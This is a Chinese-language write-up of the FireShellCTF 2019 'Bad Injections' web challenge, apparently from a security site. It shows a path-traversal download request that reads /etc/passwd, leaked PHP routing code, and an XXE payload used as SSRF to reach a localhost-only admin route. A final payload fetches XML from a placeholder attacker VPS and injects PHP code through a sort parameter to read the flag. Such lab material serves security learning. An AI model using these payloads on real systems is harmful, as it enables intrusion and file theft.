# FireShellCTF2019 Bad Injections解题记录

阅读量 **305930**

|评论 **2**

|![](https://p0.ssl.qhimg.com/sdm/30_30_100/t01f942715e2a0f1a23.png)

发布时间 : 2019-01-30 12:00:44

 **x**

##### 译文声明

本文是翻译文章

译文仅供参考，具体内容表达以及含义原文为准。

![](https://p4.ssl.qhimg.com/t01aa9e9214544ee442.png)

题目地址：<http://68.183.31.62:94>

这是整场比赛最简单的Web题…Web题质量很高，貌似现在还没有关环境

主页面有四个功能，纯静态页面。右键about页面源码信息：

![](https://i.loli.net/2019/01/28/5c4e7566b0a62.png)

给个本地web目录

接着在list页面的源码里发现信息：

![](https://i.loli.net/2019/01/28/5c4e7581ec7bc.png)

因为页面显示图片，url没有其他参数，猜测应该是readfile之类的函数读的文件。File+hash的方法，既然是ctf，那hash应该不会加key。下载一个文件试一下能不能成功

    
    
    68.183.31.62:94/download?file=files/../../../../../etc/passwd&hash=ab56ade6fe16a65bce82a7cd833f13cc
    

这里让`hash = md5(file)`，成功下载到了/etc/passwd

![](https://i.loli.net/2019/01/28/5c4e75df5ff3d.png)

尝试去读/flag发现文件不存在，去读.bash_history也不存在..捷径失败…

看到之前list下载的test.txt内容是这样的

![](https://i.loli.net/2019/01/28/5c4e75f994d2c.png)

down一下download的源码，顺便fuzz一下Controllers的文件

    
    
    68.183.31.62:94/download?file=files/../../app/Controllers/Download.php&hash=f350edcfda52eb0127c4410633efd260
    

字典只跑出来了个admin.php

![](https://i.loli.net/2019/01/28/5c4e7631e6291.png)

先是用file_get_contents加载一个文本，之后loadXML解析取值，usort排序输出。感觉存在一个XXE或者是create_function的代码注入，因为找不到/flag文件所以利用XXE没什么卵用，那应该就是代码注入了，但是要加载外部文本来引入正确xml文本才能进入函数判断。

尝试请求admin?url=xxx&order=xx死活获取不到页面，应该是路由没找对。在这卡了一会，请教腹黑师傅，才想起来去读入口文件。

    
    
    68.183.31.62:94/download?file=files/../../app/Index.php&hash=1dfd7acd700544ea7d26b8368935c4e8
    

/app/index.php

    
    
    <?php
    ini_set('display_errors',1);
    ini_set('display_startup_erros',1);
    error_reporting(E_ALL);
    require_once('Routes.php');
    
    function __autoload($class_name){
      if(file_exists('./classes/'.$class_name.'.php')){
        require_once './classes/'.$class_name.'.php';
      }else if(file_exists('./Controllers/'.$class_name.'.php')){
        require_once './Controllers/'.$class_name.'.php';
      }
    
    }
    

再去读路由/app/Routes.php

    
    
    <?php
    
    Route::set('index.php',function(){
      Index::createView('Index');
    });
    
    Route::set('index',function(){
      Index::createView('Index');
    });
    
    Route::set('about-us',function(){
      AboutUs::createView('AboutUs');
    });
    
    Route::set('contact-us',function(){
      ContactUs::createView('ContactUs');
    });
    
    Route::set('list',function(){
      ContactUs::createView('Lista');
    });
    
    Route::set('verify',function(){   
      if(!isset($_GET['file']) && !isset($_GET['hash'])){
        Verify::createView('Verify');
      }else{
        Verify::verifyFile($_GET['file'],$_GET['hash']);  //设置session，file和hash对应请求文件
      }
    });
    
    
    Route::set('download',function(){
      if(isset($_REQUEST['file']) && isset($_REQUEST['hash'])){
        echo Download::downloadFile($_REQUEST['file'],$_REQUEST['hash']);
      }else{
        echo 'jdas';
      }
    });
    
    Route::set('verify/download',function(){
      Verify::downloadFile($_REQUEST['file'],$_REQUEST['hash']);
    });
    
    
    Route::set('custom',function(){
      $handler = fopen('php://input','r');
      $data = stream_get_contents($handler); // xml
      if(strlen($data) > 1){
        Custom::Test($data);
      }else{
        Custom::createView('Custom');
      }
    });
    
    Route::set('admin',function(){
      if(!isset($_REQUEST['rss']) && !isset($_REQUES['order'])){
        Admin::createView('Admin');
      }else{
        if($_SERVER['REMOTE_ADDR'] == '127.0.0.1' || $_SERVER['REMOTE_ADDR'] == '::1'){
          Admin::sort($_REQUEST['rss'],$_REQUEST['order']);
        }else{
         echo ";(";
        }
      }
    });
    
    Route::set('custom/sort',function(){
      Custom::sort($_REQUEST['rss'],$_REQUEST['order']);
    });
    Route::set('index',function(){
     Index::createView('Index');
    });
    

原来我只down了download和admin页面，还有其它功能页面没down到，看到了玄学的admin规则如下，只有本地才能请求到sort函数

    
    
    Route::set('admin',function(){
      if(!isset($_REQUEST['rss']) && !isset($_REQUES['order'])){
        Admin::createView('Admin');
      }else{
        if($_SERVER['REMOTE_ADDR'] == '127.0.0.1' || $_SERVER['REMOTE_ADDR'] == '::1'){
          Admin::sort($_REQUEST['rss'],$_REQUEST['order']);
        }else{
         echo ";(";
        }
      }
    });
    

只能找一下其他利用，再看Custom

    
    
    Route::set('custom',function(){
      $handler = fopen('php://input','r');
      $data = stream_get_contents($handler); 
      if(strlen($data) > 1){
        Custom::Test($data);
      }else{
        Custom::createView('Custom');
      }
    });
    

Custom::Test

    
    
    class Custom extends Controller{
      public static function Test($string){
          $root = simplexml_load_string($string,'SimpleXMLElement',LIBXML_NOENT);
          $test = $root->name;
          echo $test;
      }
    }
    

$data内容可控为php://input，Test函数再将$data作为xml文本解析，那么存在XXE的问题，验证了一下可以利用

![](https://i.loli.net/2019/01/28/5c4e7655ea8f6.png)

联想到刚才admin页面只有本地才能请求，那就用Custom的XXE当跳板好了，测试一下是否能当跳板

poc:

    
    
    <?xml version='1.0'?> 
    <!DOCTYPE name [<!ENTITY  file SYSTEM "http://localhost/admin?rss=http%3A%2F%2Fyour_vps%2Fxxe.txt&order=1">]>
    <note>
    <name>&file;</name>
    </note>
    

![](https://i.loli.net/2019/01/28/5c4e7677a9567.png)

admin页面确实file_get_contents到了我vps的xxe文本。

尝试去构造正确的xml文本到执行到usort函数进行注入，warning不影响代码执行

`http://vps/xxe.txt`

    
    
    <?xml version="1.0" encoding="utf-8"?>
    <root>
    <channel>
    <item>
    <link>@hpdoger.me</link>
    </item>
    <item>
    <link>@souhu.com</link>
    </item>
    </channel>
    </root>
    

`POC`

    
    
    <?xml version='1.0'?> 
    <!DOCTYPE name [<!ENTITY  file SYSTEM "http://localhost/admin?rss=http%3A%2F%2Fvps%2Fxxe.txt&order=id%29%3B%7Decho%28file_get_contents%28%27..%2F..%2F..%2Fda0f72d5d79169971b62a479c34198e7%27%29%29%3B%2F%2F">]>
    <note>
    <name>&file;</name>
    </note>
    

![](https://i.loli.net/2019/01/28/5c4e768d57f89.png)

本文翻译自 [原文链接]()。如若转载请注明出处。

商务合作，文章发布请联系 anquanke@360.cn

本文由 **Hpdoger** 原创发布

转载，请参考[转载声明](https://www.anquanke.com/note/repost)，注明出处：
[https://www.anquanke.com/post/id/170381](/post/id/170381)

安全客 - 有思想的安全新媒体

本文转载自: []()

如若转载,请注明出处： []()

安全客 - 有思想的安全新媒体

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

  * [CTF](/tag/CTF)

 **+1** __0赞

 __收藏

![](https://p5.ssl.qhimg.com/t01b9b27da71ece1d6b.png) Hpdoger

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

